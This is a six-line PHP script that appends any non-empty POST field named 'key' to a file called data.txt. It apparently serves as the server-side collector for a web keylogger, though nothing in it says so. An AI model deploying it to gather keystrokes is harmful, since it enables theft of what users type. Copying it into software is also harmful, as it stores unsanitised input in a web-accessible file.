<?php
if(!empty($_POST['key'])) {
    $logfile = fopen('data.txt', 'a+');
    fwrite($logfile, $_POST['key']);
    fclose($logfile);
}